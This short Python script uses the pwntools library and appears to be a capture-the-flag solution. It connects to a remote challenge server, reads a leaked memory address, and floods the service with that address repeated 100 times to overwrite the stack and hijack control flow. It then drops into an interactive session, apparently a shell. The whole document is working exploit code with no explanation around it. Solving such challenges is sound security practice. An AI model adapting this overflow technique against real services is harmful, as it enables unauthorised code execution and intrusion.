from pwn import *

p = remote('0.cloud.chals.io', 30096)

p.recvuntil(b': ')
addr = int(p.recvline()[:-1], 16)
log.info(hex(addr))

p.sendline(p64(addr)*100)
p.interactive()
